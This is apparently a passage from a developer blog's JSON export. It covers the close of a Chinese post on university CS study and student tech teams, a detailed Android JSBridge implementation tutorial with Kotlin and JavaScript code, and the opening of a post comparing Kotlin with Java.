确实，算法能力的确是一名合格的程序员必不可少的基础能力，也是各大公司各大岗位面试时必定考察的内容，甚至Google、微软这样的外企只考察候选人的算法能力。但是，Google招聘的目标就是所有学生中的顶尖水平，在所有的通用能力中只有算法是适合在面试中进行考察并且很容易有区分度（Google的算法题较难）。通常，能在算法的学习上达到顶尖水平的学生在其他方向的潜力也是极大的。但对于工程岗日常开发，并不会涉及到非常复杂的算法，面试中考察的算法难度也相对较低，主要目的是考察基本的编码能力和编码风格、候选人准备的充分程度、逻辑思维能力以及思考的全面性，这些能力一部分是之前的积累，另一部分通过一段时间的练习完全可以达标（如何准备工程岗算法面试在后续文章再谈）。 在薪酬方面，确实在以往头部的算法岗会比工程岗高上一些，但可以在算法岗的激烈竞争中拿下头部Offer的人相对于工程岗来说是凤毛麟角，而在当今供需关系不平衡的背景下，算法岗薪资的优势已经近乎不复存在，很多公司已经开始不区分这两个岗位的薪资。在相对小很多的竞争中，工程岗通过努力拿到SP/SSP Offer从而在薪资上领先普通算法岗Offer的机会大很多，而各大公司对于工程岗头部人才的争抢程度远超想象。 所谓“天花板”盲目选择的另一原因是听从了各种例如“前端工作太低级，后端开发才有深度”、“客户端开发就是天天画界面，不如做后端还能成为架构师”、“XXX没前途，几年就到天花板了，没竞争力”的言论，甚至很多工作几年的所谓前辈也会劝在校学生去做他们认为“有前途、天花板高”的方向，我大二在头条实习的时候同事就曾对我说过：“你条件这么好，做客户端可惜了，趁早转个后端吧”。 觉得偏应用、偏前台的岗位技术难度不大、没有发展空间，进而在不深入了解的情况下盲目选择后端方向，这是工程岗中客户端、前端尤其稀缺的原因。这样的认知对于刚进入大学的新人来说是非常不利的。 前面说过，在大学四年内不太可能从零开始到完全掌握一个技术方向，所谓的“天花板”也只是一部分人在技术能力上停滞不前时的借口。更何况在大学中学习一个技术方向很多情况下只是系统地学习计算机基础知识的切入点。 以我比较熟悉的Android开发为例： 在学习Android开发的初期，确实需要掌握绘制界面这样看起来简单的技能，这是一个应用最上层的、展示给用户使用的部分，在学习界面绘制后，我们很快将会需要处理用户的输入事件、做出响应，在这个过程中，将会接触到很多系统提供的接口，由此，我们开始对用户（相对于系统而言）代码和系统间的交互方式有了一个基本的了解。 虽然一开始可能只是照着书本或者网上写一些自己也不懂什么作用的代码，但是一旦学会查阅文档，了解每个接口的作用与行为后，我们将会对系统的行为有进一步的了解。 当跨越熟悉接口这一阶段、有了对系统行为的初步认知后，我们已经可以独立完成简单的应用了，但当应用的逻辑进一步复杂化时，难免会遇到问题，在查阅资料，解决问题的过程中，为了完全理解系统的行为，我们将会跨出非常重要的一步：阅读系统源码（Android的系统源码是开源的）。由此开始，我们对于Android的学习不再仅限于开发应用、绘制界面本身，而是开始深入地探究一个系统背后的运行原理与设计理念。 而Android作为一个非常成熟的操作系统，有着庞大而又清晰的分层设计： 纵向来看，Android自上而下地贯穿了应用层面到系统内核层面；横向来看，Android的各个子系统、子模块间相互独立，又有着交互与通信；Android同时也是一个基于Linux的操作系统，借由Android我们也可以一窥Linux的种种概念，例如几乎所有的Linux进程间通信方式在Android的源码中都有所体现，同时Android又根据自身的需求设计了大名鼎鼎的进程间通信框架Binder，从对Binder通信机制的学习中，我们可以看到一个驱动级别的组件，是如何通过系统和框架的层层封装，转变为我们日常开发中所能见到的Java层的AIDL工具。我也曾为了弄清楚“触摸事件道到底是哪里来的？”这一问题，顺着源码从Android SDK一路看到了触摸驱动。而这样的例子数不胜数，每次深入探究的过程，都是充满趣味和最终的成就感的。 系统地阅读Android源码的过程，既是对软件架构与设计的理解和学习，又可以深入到系统底层实现中，理解操作系统的方方面面。可以说，这样的过程将我们零散的、琐碎的计算机知识有效地组织了起来，打通了我们从应用直至系统的整个知识体系，同时又可以驱使我们去不断补充相关知识，从各个方面提升自己的能力。 看到这里，你还会认为对Android开发的学习只是画画界面这么简单吗？事实上，这样“以技术方向为切入点，深入学习计算机的方方面面”的学习方式已经成了团队成员进行技术学习的宗旨之一（具体见后续文章），带来的结果是每个人在拥有对技术方向的深入了解的同时，在计算机的基础知识和全面认识方面的综合能力也远超他人，这也就解释了为什么很多队员在毕业后可以很轻松地转向另一个方向，团队Android组往届学长有去阿里做前端的、去美团做后端的，我在微信的岗位实际上也是游戏方向，并且在很短的时间内上手了iOS开发。 所以，个人的技术水平永远不是选择的方向所能决定的，了解一下各个方向的大牛们在做什么就能轻易地明白这一点。在大学这个阶段，选择一个技术方向时，更不应该考虑这些因素，是否能全身心地投入其中，保持不断的深入学习才是更重要的。 那么，应该如何学习呢？这个问题是下篇文章的重点，在这里就先吊个胃口了。 可以试错既然真正学习的是计算机基础知识，那么选择的方向其实在一开始并不是那么重要，如果发现自己一开始对这个方向的了解出现了偏差，在毕业后并不想从事这个方向的工作，完全可以选择换一个方向，学到的基础知识永远不会作废。大学中一个极大的优势就是可以近乎无成本地试错。在毕业真正走向工作岗位后，主动对自己的岗位做出调整的机会就小很多，也要付出相应的代价。 所以，大胆地选择一个方向吧，没有什么可以担心的，Follow Your Heart! 技术团队在本文的最后一部分，谈谈我在前文多次提到的联创团队及这样一个团队（或是类似的组织、实验室、甚至是学习小组等）能给我们带来什么。 首先介绍下我所加入的联创团队，联创团队是华科的一个学生技术团队，至今已经有20年的历史。很多人第一反应会是：这是个社团吗？其实团队和社团完全不同，我们没有真正意义上的指导老师，是一个纯学生组织，完全由学生自己负责团队的一切事务；但是我们却隶属于华中科技大学的启明学院，在学院的大楼中有自己独立的办公场地，是学院提供支持的创新团队，图为启明学院大楼、团队场地。 团队因兴趣而起，由一批志同道合的学生创立，联创二字就意为“联众人之志，创非凡之事”。团队成员曾在微软创新杯中多次取得名次；在2016世界大学生超算大赛获得全球第一名；举办了国内第一个面向大学生的Unique Hack-Day（编程马拉松）并延续六届。 目前团队内部按照兴趣分为了Android/iOS/Web/Game/AI/Design/PM/Lab八个组，在每年进行两次主要的招新和一次夏令营招新，招新会设置一轮笔试、一轮组内面试、一轮熬夜测试和最后的群体面试，比较有特色的是熬夜测试，新人会被要求在一个晚上的时间内（21点-次日7点）完成各组的编程题目，可以查阅任何资料，目的是考查热情和短时间内的学习能力。经过层层面试筛选出来的新人还需要经历一个学期的实习期，需要完成布置的项目任务。 这样的经历是非常难忘，我至今还记得那晚是我第一次为了一个目标如此投入，为了完成那六道题目忘记了时间的流逝和身体的困倦，大概也是从那时候开始明白全身心的投入可以完成怎样之前不曾想象的事情。 这一套严格的招新标准已经在团队实行了多年，本着宁缺毋滥的原则，目的是为了筛选出真正对计算机有学习热情，并且有不错的学习能力的同学。事实上每年能加入团队的新人每组都在个位数，甚至经常会出现一个不招的情况。 事实证明这样的招新标准带来的是团队内部较好的氛围和真正志同道合、可以共同进步的队友们，也就是满足文章前几节所说的：有自驱力、热情、并且明白自己想要什么的人。 那么，加入团队以后需要做什么呢？其实，除了唯一的时间要求和实习期的任务，没有其他任何的限制，也没有所谓的课程或是培训，前面说过团队的宗旨是把志同道合的同学聚在一起，而要做的事情则完全看大家的想法，我们会因为兴趣去做一些项目、一起打一个比赛、甚至是举办一个比赛。当然，绝大部分的时间都是在自学中度过的。 先来谈谈时间要求，团队会要求实习期的同学每周在团队办公场地待满40小时的时间（正式队员要求略低），为什么要设立这样一个（也是唯一的一个）制度呢？首先，这基于一个认识：只有付出了相应时间的投入，才有可能取得对应的收获，之后将要说的所有的学习的方式方法，都必须基于一点——投入足够的时间，这也是团队传承这么多年来留下的金规玉律；其次，为什么限制一定要在团队？一是为了形成一种约束，不是每个人都有着极强的自制力来保证每天的学习时间，所谓寝室是大学生的坟墓，专门的场地可以把时间集中起来，提高学习的效率；二是为了形成一种氛围，每个人的认知都有局限性，即使学习的是一个方向的知识，很多时候也做不到面面俱到，把大家都放到同一个屋子里，相互交流，取长补短，才能共同进步；三是为了做项目、打比赛方便，团队的前辈们也曾为了微软创新杯在学校外面租了个房子待了三个月，就像微信诞生的小黑屋那样，和志同道合的人在一起为一个目标奋斗的感觉是非常棒的。 团队会为每个新人分配一名学长作为mentor（导师），对新人的任务进度、代码质量、学习路线进行指导，这也是经验传承的一部分，很多东西（比如代码从一开始就注重code style、尽可能使用Google等等下篇文章的主要内容）都是这样一代代总结和传承下来的。有了这样的引路人做一对一不遗余力的指导，才能保证每个人的方向不至于走偏。 在每周的固定时间，各组内会进行meet up（周会），每个人需要详细介绍自己一周学习的内容，并一般会进行某个方面的分享，分享内容通常是自己最近深入学习或是觉得有意思的某个主题。在了解别人学习内容的过程中，可以知道同级的同学的学习进度，也会知道学长们在做的事情（也就是自己未来将会接触的内容），这样就能比较容易地知道自己还有哪些地方不足，以及未来需要掌握的内容。我也是从学长们的一次次分享中了解了原来Android的源码中有着这么多值得学习的点，明白了基础知识的重要性，知道了外面的企业需要我们拥有什么能力。而这些东西，没有团队的交流，我想不可能这么早就能意识到。也就是在不知不觉中，在团队中学到的东西已经远远超过了课内所学习的，所以很多学长毕业时会留下这样一句话： 我的大学叫联创 这句话到了我这里依然成立。 一个人的力量终究是有限的，当这条路上有人陪伴的时候才能走得更远，所以，如果你的学校有类似的组织，非常推荐你尝试加入。如果没有，我相信总会有和你志同道合的人等待着你，也同样会有已经走上这条路的学长愿意去与你分享这些经验，我也是其中的一员。 这是全文的第一部分，介绍了在刚进入大学时需要思考的一些问题。在下一篇文章中，将主要会介绍一些在大学中学习计算机的一些方法与经验。 如果以上的内容对你有所帮助，欢迎你把它分享给更多人，谢谢！ 如果有任何想法、疑问、意见或是建议，欢迎关注公众号VirMe留言交流。 从开始到微信/支付宝/Airbnb/抖音Offer——我的大学客户端开发学习之路（一）开始——步入大学生活 从开始到微信/支付宝/Airbnb/抖音Offer——我的大学客户端开发学习之路（二）过程——技术学习与个人成长","tags":[{"name":"Summary","slug":"Summary","permalink":"https://www.viseator.com/tags/Summary/"}]},{"title":"Android JSBridge原理与实现","date":"2018-09-07T06:37:33.000Z","path":"2018/09/07/android_JSBridge/","text":"背景​WebView​作为承载动态页面的容器，在安卓中本身只是一个用于加载​web​页面的视图控件，但​web​页面中常需要与​Native​进行交互动作，比如跳转到一个​Native​页面、弹出一条​Toast​提示、检测设备状态等。 在更加复杂的情境中： 小程序 需要根据​web​的需要在​WebView​上覆盖显示一些​Native​控件以提供接近​native​的体验（​input​框、地图等） 提供一些诸如本地储存、定位数据之类的服务供​web​使用（虽然部分走的是​V8​引擎，但仍需要​JSBridge​去进行一些通信） 强Hybrid应用 ​Native​控件与​web​频繁交互 ​Native​页面/组件利用​JSBridge​与后端同步数据，简化后端工作量（不需要维护两套通信接口），但过度依赖于​WebView​ 以上通信的基础设施就是​JSBridge​，​JSBridge​的实现本身并不复杂，可以看作是对系统接口的二次封装。 从系统接口说起 *AndroidNative调用js相对来说比较简单，​webview​为我们提供了如下两个接口来执行​js​代码： api19之前： 12345678/** * Loads the given URL. * &lt;p&gt; * Also see compatibility note on &#123;@link #evaluateJavascript&#125;. * * @param url the URL of the resource to load */public void loadUrl(String url) api19之后（效率更高）： 123456789101112131415161718/** * Asynchronously evaluates JavaScript in the context of the currently displayed page. * If non-null, |resultCallback| will be invoked with any result returned from that * execution. This method must be called on the UI thread and the callback will * be made on the UI thread. * &lt;p&gt; * Compatibility note. Applications targeting &#123;@link android.os.Build.VERSION_CODES#N&#125; or * later, JavaScript state from an empty WebView is no longer persisted across navigations like * &#123;@link #loadUrl(String)&#125;. For example, global variables and functions defined before calling * &#123;@link #loadUrl(String)&#125; will not exist in the loaded page. Applications should use * &#123;@link #addJavascriptInterface&#125; instead to persist JavaScript objects across navigations. * * @param script the JavaScript to execute. * @param resultCallback A callback to be invoked when the script execution * completes with the result of the execution (if any). * May be null if no notification of the result is required. */public void evaluateJavascript(String script, ValueCallback&lt;String&gt; resultCallback) 我们只需要构建​javascript:​开头形式的代码字符串传入执行就可以了，以上两个方法都是直接返回的。 js调用Native实现方式比较多样，先上一张图： shouldOverrideUrlLoading拦截特定schema​WebView​提供了​shouldOverrideUrlLoading​方法允许我们拦截​web​页面加载的​url​，我们可以利用这个方法采用加载伪协议的方式进行通信： 12345678910public class CustomWebViewClient extends WebViewClient &#123; @Override public boolean shouldOverrideUrlLoading(WebView view, String url) &#123; ...... // 截取url并操作 return true; &#125; return super.shouldOverrideUrlLoading(view, url); &#125;&#125; 伪协议形式根据业务不同复杂度也不同，后面的工作主要就是围绕这个scheme字符串解析/生成。 在​web​端，采用加载不可见​iframe​的方式传递​url​到​Native​：1234567891011function openURL (url) &#123; var iframe = document.createElement('iframe'); iframe.style.cssText = 'display:none;width:0px;height:0px;'; var container = document.body || document.documentElement; container.appendChild(iframe); iframe.onload = fail; iframe.src = url; setTimeout(function() &#123; iframe.parentNode.removeChild(iframe); &#125;, 0); &#125; 但是此方法在测试中存在一个比较严重的问题：无法在短时间内回调多次​shouldOverrideUrlLoading​方法，也就是说频繁交互的情况下，会有较大概率多次​url​跳转只回调一次该方法，在​github​上非常著名的一个​JSBridge​实现中，将消息排队压缩为一个消息，然后使用一个​url​去通知​Native​调用​js​的取消息​Handler​，​js​再将整合后的消息一起发送给​Native​。 不幸的是，这种方式仍有丢消息的情况，有一笔pr修复了该问题，采用了两个​iframe​一个用于通知、一个用于数据传送。但该方式的效率会显著低于以下几种。 onJsPrompt传递数据在​js​调用​window​的​window.alert​，​window.confirm​，​window.prompt​三种方法时，​WebView​中注入的​WebChromeClient​对象的对应方法会被调用，并且可以带有​js​传递过来的参数，我们可以选择其中之一作为我们数据传递的通道，由于​promopt​使用频率较低，所以一般采用它作为调用方法。 1234567public class JSBridgeWebChromeClient extends WebChromeClient &#123; @Override public boolean onJsPrompt(WebView view, String url, Stringt message, String defaultValue, JsPromptResult result) &#123; //对message进行处理 return true; &#125;&#125; ​js​中只要调用​window.prompt​就可以了： 1window.prompt(uri, \"\"); 数据传递的格式并没有要求，我们可以采用上述的​schema​或者自己另外制定协议。如果出于与​js​保持一致的考虑，就使用​schema​。 console.log传递数据与上种方法大同小异，只不过利用的是​js​调用​console.log​时WebChromeClient的onConsoleMessage回调来处理消息，​js​端只要使用​console.log​就可以了。 addJavascriptInterface注入对象​addJavascriptInterface​是​WebView​的一个方法，顾名思义，这个方法是安卓为我们提供的官方实现​JSBridge​的方式，通过它我们可以向​WebView​加载的页面中注入一个​js​对象，​js​可以通过这个对象调用到相应的​Native​方法：123456789// class for injecting to jsclass Bridge &#123; @JavascriptInterface fun send(msg: String) &#123; doSomething() &#125;&#125;// inject Bridge as _sBridgewebview.addJavascriptinterface(Bridge(), \"_sBridge\") 我们创建了一个​Bridge()​对象并作为​_sBridge​注入到了​webview​的当前页面中，在​js​端即可以通过以下形式调用：1window._sBridge.send(msg);该方法是阻塞的，会等待​Native​方法的返回，​Native​会在一个后台线程中执行该方法调用。关于安全性问题：在安卓4.2之前通过注入的对象进行反射调用可以执行其他类的一些方法，存在严重安全漏洞，具体见：https://blog.csdn.net/weekendboyxw/article/details/481750274.2之后加入了上述的​@JavascriptInterface​注解来避免暴露额外的方法，从而解决了这一问题。 性能测试 测试方法：​&gt; js​端收到​Bridge​注入完成的事件后，连续触发100次传递消息到​Native​的方法调用，传递2w个英文字符作为消息体，在​Native​端作处理时分别采用立即返回和延迟10ms返回模拟方法处理耗时。统计​js​调用开始到结束的平均时间。 方法 方式立即返回耗时 延迟10ms返回耗时 addJavascriptInterface 1.2ms 13.37ms shouldOverrideUrlLoading - - onJsPrompt 1.78ms 15.87ms console.log 0.16ms 0.16ms（完全不阻塞） ​shouldOverrideUrlLoading​方式由于采用队列压缩消息，耗时数据与实际业务中数据收发频率相关，暂不测试，可以认为耗时显著高于其他几种。 如何选择从编码角度上看，​addJavascriptInterface()​方法实现是最为简洁明了的，同时上表中的速度一栏，在实际测试中发现​addJavascriptInterface()​方法耗时比​onJsPrompt​要少。 ​console.log()​在​10ms​延迟测试中由于自身不阻塞的特性，耗时较短，但在实际处理中，会在​addJavascriptInterface()​中另开线程去异步处理消息，延迟时间也非常短。 综上，使用​addJavascriptInterface​作为​js​向​Native​传递数据的通道是较为合理的选择。如果实在对耗时要求高，可以考虑采用​console.log()​的方式。 JSBridge上层实现有了上述的双端通信的基础通道，我们就可以基于此去构建一套易用的方法封装。 消息格式为了一定程度上兼容​iOS​端的​JSBridge​，我们双端都采用注册​Handler​，以​Handler​名作为方法索引，再使用​json​作为参数数据的序列化/反序列化格式。下一步解决的问题是如何回调调用方的​callback​，我们期望异步调用在完成时被调用方通过回调​callback​方法来返回数据。这里采用注册​Handler​的思路，在调用方进行调用时，为​callback​方法生成一个​callbackId​作为​Key​来保存这个​callback​方法，被调用方完成处理之后，在返回的消息中一并返回​callbackId​（这时它变为了​responseId​），调用方拿到​callbackId​找到对应方法进行回调。 依此，我们制定的消息格式如下：1234567&#123; \"handlerName\": \"NameOfHandler\", \"data\": \"json data\", // 传送给接收方的数据 \"callbackId\": \"\", // 接收方回调调用方的方法id \"responseId\": \"\", // 调用方被回调时收到的方法id，即为发送时的callbackId参数 \"responseData\": \"json data\" // 接收方返回的数据&#125; 通信过程可以由下图表示： 为了兼容​schema​格式，在消息体的基础上添加​schema​头部，组成最终的消息协议：1CUSTOM_PROTOCOL_SCHEME + &#39;:&#x2F;&#x2F;data&#x2F;message&#x2F;&#39; + messageQueueString​messageQueueString​为​json​数组，一个​json​元素为一条消息。 双端通信封装当​Native​的​WebView​加载页面到80%以上时，会不断尝试将本地的一个bridge.js文件注入到​WebView​中，不断尝试是为了解决在弱网状况下一次注入可能失败的问题，js代码保证初始化不会重复进行，后续这个文件的代码可以放在前端加载。bridge.js负责初始化​LkWebViewJavascriptBridge​类，封装了一些通信的方法和数据对象。 bridge初始化bridge.js：12345678910111213141516171819... var LkWebViewJavascriptBridge = window.LkWebViewJavascriptBridge = &#123; init: init, send: send, registerHandler: registerHandler, callHandler: callHandler, callSync: callSync, _handleMessageFromNative: _handleMessageFromNative, debug: true &#125;; _log(\"local js injected\"); // notify java callHandler(\"s.bridge.ready\", JSON.stringify(\"ready msg from js\")); var doc = document; var readyEvent = doc.createEvent('Events'); readyEvent.initEvent('LkWebViewJavascriptBridgeReady'); readyEvent.bridge = LkWebViewJavascriptBridge; doc.dispatchEvent(readyEvent);1-9行创建了​window.LkWebViewJavascriptBridge​对象，用于访问文件中定义的几个方法（见下文），14行调用s.bridge.ready​这个​Native​预设的​Handler​，通知​js​端的​Bridge​已完成初始化。随后15-19行触发一个自定义事件，用于通知​web​其他组件​JSBridge​已初始化完成，可以开始通信了。 JS调用Native Handler流程1234567891011121314151617181920212223242526272829303132LkWebViewJavascriptBridge.callHandler(\"java_handler\", \"\\\"js data\\\"\", function (resJson) &#123; console.log(\"data callback from java: \") console.log(resJson) &#125;)// js call java handlerfunction callHandler(handlerName, data, responseCallback) &#123; _doSend(&#123; handlerName: handlerName, data: data &#125;, responseCallback);&#125;// sendMessage add message, 触发native处理 sendMessagefunction _doSend(message, responseCallback) &#123; // debugger; _log(\"&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; _doSend: \" + message.handlerName + \" \" + time()); if (responseCallback) &#123; var callbackId = 'cb_' + uniqueId++ + '_' + new Date().getTime(); responseCallbacks[callbackId] = responseCallback; message.callbackId = callbackId; &#125; sendMessageQueue.push(message); var array = []; array.push(message); var messageQueueString = JSON.stringify(array); window._sBridge.send(CUSTOM_PROTOCOL_SCHEME + '://data/message/' + messageQueueString); _log(\"_doSend end &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;: \" + message.handlerName + \" \" + time());&#125; 代码逻辑结合上面的消息格式看并不复杂。\b 注意到20、21行为​callback​生成了​callbackId​并存入了​responseCallbacks​ ​map​中，以便后面回调的处理。 ​window._sBridge.send​即为​Native​通过​addJavascriptInterface​注入的方法，目前只注入了这一个方法用于数据传输。 这条数据是这样的：1s:&#x2F;&#x2F;data&#x2F;message&#x2F;[&#123;&quot;handlerName&quot;:&quot;java_handler&quot;,&quot;data&quot;:&quot;\\&quot;js data\\&quot;&quot;,&quot;callbackId&quot;:&quot;cb_1_1534851889294&quot;&#125;]​Native​收到​send​调用后，进行如下的事件分发处理： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465/** * handle message from js by call _sBridge.send(msg) */@SuppressLint(\"CheckResult\")@JavascriptInterfacefun send(msg: String) &#123; Logger.v(TAG, \"\\n&lt;-----raw msg from js----&gt;\\n$msg\") Flowable.just(msg).subscribeOn(sSchedulers.io()) .filter &#123; // filter blank or wrong data if (it.isBlank() || !it.startsWith(BridgeUtil.LARK_RETURN_DATA)) &#123; Logger.e(TAG, \"&lt;-----illegal msg from js----&gt;\") return@filter false &#125; return@filter true &#125;.concatMap &#123; // separate data from msg val data = BridgeUtil.getDataFromReturnUrl(it) ?: throw IllegalStateException(\"can't parse message from js\") // deserialize Message val list: List&lt;Message&gt; = Message.toArrayList(data) return@concatMap if (list.isEmpty()) &#123; Flowable.just(Message()) &#125; else Flowable.fromIterable(list) &#125;.flatMap &#123; if (it.responseId.isNullOrBlank()) &#123; // call java handler val callbackFunction = generateJavaCallbackFunction(it.callbackId) val handler = getBridgeHandler(it.handlerName) val action = Action &#123; handler?.handle(it.data, callbackFunction) &#125; when (handler?.getType()) &#123; UI -&gt; &#123; // run on mainThread return@flatMap Flowable.just(action) .subscribeOn(sSchedulers.mainThread()) &#125; BACKGROUND -&gt; &#123; // run on background return@flatMap Flowable.just(action) .subscribeOn(sSchedulers.io()) &#125; else -&gt; &#123; return@flatMap Flowable.empty&lt;Action&gt;() &#125; &#125; &#125; else &#123; // response from js val javaCallback = javaCallbacks[it.responseId] if (javaCallback == null) &#123; Logger.i(TAG, \"callback not found for responseId: $&#123;it.responseId&#125;\") return@flatMap Flowable.empty&lt;Action&gt;() &#125; else &#123; return@flatMap Flowable.just(Action &#123; javaCallback.onCallback(it.responseData) &#125;).subscribeOn(sSchedulers.io()) // response callback would run on background by default &#125; &#125; &#125;.subscribe(&#123; it.run() &#125;, &#123; Logger.e(TAG, \"handle msg from js error: \", it) &#125;)&#125; 代码逻辑如下： 检查消息的合法性（协议等） 提取消息体并将消息体反序列化为一个​Message​对象的列表 判断​responseId​是否为空，如果为空，说明为​JS​对​Handler​的\b调用，否则为对一条​Native​消息的回调，我们这里是对s.bridge.ready的调用 生成​callback​函数供​handler​调用：1234567891011121314151617private fun generateJavaCallbackFunction(callbackId: String?): ICallbackFunction &#123; return if (callbackId.isNullOrBlank()) &#123; object : ICallbackFunction &#123; override fun onCallback(data: String?) &#123; // do nothing &#125; &#125; &#125; else &#123; object : ICallbackFunction &#123; override fun onCallback(data: String?) &#123; // send data back to js val msg = Message(responseData = data, responseId = callbackId) sendToJs(msg) &#125; &#125; &#125;&#125; 可以看到，如果消息中有​callbackId​的话，就会将​handler​传入的消息作为​responseData​，​callbackId​作为​responseId​构建消息发送到​js​以完成回调。 获取​handler​，这个过程会把注册在一个​map​中\b的​handler​根据​handlerName​作为​key​取出 对​handler​类型做判断，目前有两种，一种会运行在主线程，一种会运行在后台线程池 在对应的线程中调用​handler.handle()​传入​data​和生成的​callbackFunction​作为参数，这样就完成了找到对应​handler​并执行其逻辑的过程，​handler​执行的时候像这样：1234override fun handle(data: String?, callback: ICallbackFunction) &#123; Toast.makeText(context, data, Toast.LENGTH_LONG).show() callback.onCallback(\"&#123; \\\"data\\\":\\\"callback data from java\\\"&#125;\")&#125; 直接调用​callback​的​onCallback​回传数据就可以了。 ​onCallback​通过​sendToJs()​方法传递数据到​js​：12345678fun sendToJs(msg: Message) &#123; var messageJson = msg.toJson() // escape special characters for json string messageJson = messageJson?.replace(\"(\\\\\\\\)([^utrn])\".toRegex(), \"\\\\\\\\\\\\\\\\$1$2\") messageJson = messageJson?.replace(\"(?&lt;=[^\\\\\\\\])(\\\")\".toRegex(), \"\\\\\\\\\\\"\") val javascriptCommand = String.format(BridgeUtil.JS_HANDLE_MESSAGE_FROM_JAVA, messageJson) doSendJsCommand(javascriptCommand)&#125; 将​Message​进行序列化，同时处理转义字符的问题，然后第6行将消息格式化为一条对​js​的方法调用指令：12const val JS_HANDLE_MESSAGE_FROM_JAVA = \"javascript:LkWebViewJavascriptBridge._handleMessageFromNative(\\\"%s\\\");\" 实际上调用了之前注入的​_handleMessageFromNative​方法，然后调用​doSendJsCommand​执行指令：1234567private fun doSendJsCommand(javascriptCommand: String) &#123; if (android.os.Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.KITKAT) &#123; evaluateJavascript(javascriptCommand, null) // return value not used &#125; else &#123; loadUrl(javascriptCommand) &#125;&#125; 现在，消息传递到了​js​的​_handleMessageFromNative()​方法：12345678910111213141516171819202122232425262728293031323334353637383940414243444546 // java 调用入口 function _handleMessageFromNative(messageJSON) &#123; if (receiveMessageQueue &amp;&amp; receiveMessageQueue.length &gt; 0) &#123; receiveMessageQueue.push(messageJSON); &#125; else &#123; _dispatchMessageFromNative(messageJSON); &#125; &#125;// 提供给native使用 function _dispatchMessageFromNative(messageJSON) &#123; _log(\"&lt;-----raw msg from java----&gt;\\n\" + messageJSON); (function () &#123; var message = JSON.parse(messageJSON); var responseCallback; // java call finished, now need to call js callback function if (message.responseId) &#123; // 对某条已发送消息的回复 responseCallback = responseCallbacks[message.responseId]; if (!responseCallback) &#123; return; &#125; var resJson = JSON.parse(message.responseData); responseCallback(resJson); &#125; else &#123; // 调用js handler if (message.callbackId) &#123; // java callback var callbackResponseId = message.callbackId; responseCallback = function responseCallback(responseData) &#123; _doSend(&#123; responseId: callbackResponseId, responseData: responseData &#125;); &#125;; &#125; var handler = LkWebViewJavascriptBridge._messageHandler; // 查找指定handler if (message.handlerName) &#123; handler = messageHandlers[message.handlerName]; &#125; handler(message.data, responseCallback); &#125; &#125;)(); &#125; ​_dispatchMessageFromNative​的代码逻辑其实和刚刚分析的​send​方法是一样的（对等的过程），现在我们收到的消息是这样的：1&#123;\"responseData\":\"&#123; \\\"data\\\":\\\"callback data from java\\\"&#125;\",\"responseId\":\"cb_1_1534851889294\"&#125;\" 所以​js​会根据​responseId​从​​responseCallback​s ​map​中取出对应的​callback​并执行。 到这里，一次完整的异步通信就完成了。Native调用JS Handler过程这个流程与上一步完全对等，代码逻辑也是一样的，故不再分析。","tags":[{"name":"Android","slug":"Android","permalink":"https://www.viseator.com/tags/Android/"},{"name":"Hybrid","slug":"Hybrid","permalink":"https://www.viseator.com/tags/Hybrid/"},{"name":"JSBridge","slug":"JSBridge","permalink":"https://www.viseator.com/tags/JSBridge/"}]},{"title":"Kotlin优势浅析 我们为什么应该使用Kotlin开发新项目","date":"2018-07-11T03:38:35.000Z","path":"2018/07/11/introduce_kotlin/","text":"Backgroud/Target由Jetbrains在圣彼得堡的团队开发，得名于附近的一个Kotlin的小岛。 Jetbrains有多年的Java平台开发经验，他们认为Java编程语言有一定的局限性，而且由于需要向后兼容，它们很难得到解决。因此，他们创建了Kotlin项目，主要目标包括： 兼容Java 编译速度至少同Java一样快 比Java更安全 比Java更简洁 比最成熟的竞争者Scala还简单 与其他JVM上的语言一样，编译成Java字节码 https://www.kotlincn.net/docs/tutorials/ 中文文档 https://kotlinlang.org/docs/reference/comparison-to-java.html 英文文档中对比Java的索引 为什么要使用非语言层面 Jetbrains自己用于开发桌面IDE 谷歌钦定，不用担心跑路没支持 谷歌Demo和很多开源项目开始全面采用，不学看不懂了 Android Studio支持完善 语言层面对下文中提到的Kotlin做出的语言上的改进做一个总结： 通过语法层面的改进规范了一些行为 “消灭”了NPE 语法更加灵活清晰/减少冗杂的代码 变量声明更加符合直觉 代码逻辑更加收敛/符合直觉 减少样板代码的使用 更舒服的lambda 最终归在一点：集中精力 提高效率 减少错误 Kotlin做出的改变变量/类型123456789// 只读变量声明(更友好） 想想finalval a: Int = 1 // 后置类型声明// 一般利用类型推断，思维更加顺畅，不用再关心参数是什么类型的问题val a = 5val s = String()val clazz = s.getClass()val method = clazz.getDeclaredMethod(\"name\", null) // 可变变量声明var x = 5 不再有基本类型的概念，但运行时仍是基本类型表示（除了Int?…这类nullable变量，是包装类型）。 数组用Array&lt;&gt;类型表示，现在数组也是不可协变的了。 控制流if else语句除了与java一致的用法外，还取代了条件运算符?: 1val max = if (a &gt; b) a else b // int max = (a &gt; b) ? a : b; 但用法更加灵活：1234567return if (a &gt; b) &#123; print(\"return a\") a&#125; else &#123; print(\"return b\") b&#125;for的语法糖：123456789101112for (i in array.indices) &#123; println(array[i])&#125;for ((index, value) in array.withIndex()) &#123; println(\"the element at $index is $value\")&#125;for (i in 1..3) &#123; println(i)&#125;for (i in 6 downTo 0 step 2) &#123; println(i)&#125;when取代switch，更加强大的分支：12345678910111213141516171819when (x) &#123; 0, 1 -&gt; print(\"x == 0 or x == 1\") else -&gt; print(\"otherwise\")&#125;when (x) &#123; in 1..10 -&gt; print(\"x is in the range\") !in 10..20 -&gt; print(\"x is outside the range\") else -&gt; print(\"none of the above\")&#125;// 有返回值val hasPrefix = when(x) &#123; is String -&gt; x.startsWith(\"prefix\") else -&gt; false&#125;when &#123; x.isOdd() -&gt; print(\"x is odd\") x.isEven() -&gt; print(\"x is even\") else -&gt; print(\"x is funny\")&#125; 类和对象引入属性的概念，隐式的getter与setter：12345678class Test &#123; var a = 0 // has setter and getter val b = 1 // just has getter private c = 2 // no setter and getter&#125;val test = Test()test.a = test.b // test.setA(test.getB())再也不用写setter/getter逻辑了：123456789101112131415var stringRepresentation: String get() = this.toString() set(value) &#123; setDataFromString(value) &#125;// 相当于 public String getStringRepresentation() &#123; return this.toString();&#125;public void setStringRepresentation(String value) &#123; setDataFromString(value) &#125;java中已有的getter/setter会被“转换”成kotlin属性的形式 Null安全 